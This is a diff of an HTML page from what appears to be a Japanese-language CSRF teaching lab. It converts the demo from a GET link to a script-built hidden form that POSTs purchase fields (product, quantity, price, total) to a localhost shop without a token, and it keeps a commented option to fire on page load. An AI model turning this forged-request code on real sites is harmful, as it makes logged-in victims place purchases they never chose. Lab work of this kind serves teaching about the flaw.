@@ -38,9 +38,9 @@
       <label>note</label>
       <input id="note" value="CSRF_purchase" />
 
-      <button id="attackBtn" type="button">CSRFを実行（GET）</button>
+      <button id="attackBtn" type="button">CSRFを実行（POST）</button>
       <div class="muted">
-        注: 学習の再現性のため、Shop側に <code>/csrf/purchase</code>（GET購入）を用意しています。
+        フォーム送信で <code>/purchase</code> に POST します（トークンなし、Cookieだけで実行）。
       </div>
     </div>
 
@@ -49,7 +49,7 @@
       const TARGET_BASE = window.__TARGET_BASE__ || "http://localhost:4000";
       document.getElementById("targetBase").textContent = TARGET_BASE;
 
-      function buildUrl() {
+      function buildPayload() {
         const product_id = document.getElementById("productId").value;
         const quantity = document.getElementById("quantity").value;
         const unit_price_yen = document.getElementById("unitPrice").value;
@@ -62,21 +62,31 @@
         const auto = Number.isFinite(u) ? u * n : n;
         const total_yen = total_input === "" ? auto : total_input;
 
-        const url = new URL("/csrf/purchase", TARGET_BASE);
-        url.searchParams.set("product_id", product_id);
-        url.searchParams.set("quantity", quantity);
-        url.searchParams.set("unit_price_yen", unit_price_yen);
-        url.searchParams.set("total_yen", total_yen);
-        url.searchParams.set("note", note);
-        return url.toString();
+        return { product_id, quantity, unit_price_yen, total_yen, note };
+      }
+
+      function submitPost() {
+        const payload = buildPayload();
+        const form = document.createElement("form");
+        form.method = "POST";
+        form.action = new URL("/purchase", TARGET_BASE).toString();
+        Object.entries(payload).forEach(([k, v]) => {
+          const input = document.createElement("input");
+          input.type = "hidden";
+          input.name = k;
+          input.value = v;
+          form.appendChild(input);
+        });
+        document.body.appendChild(form);
+        form.submit();
       }
 
       document.getElementById("attackBtn").addEventListener("click", () => {
-        location.href = buildUrl();
+        submitPost();
       });
 
       // 自動実行（ページを開いた瞬間にCSRFを走らせたい場合）
-      // location.href = buildUrl();
+      // submitPost();
     </script>
   </body>
 </html>
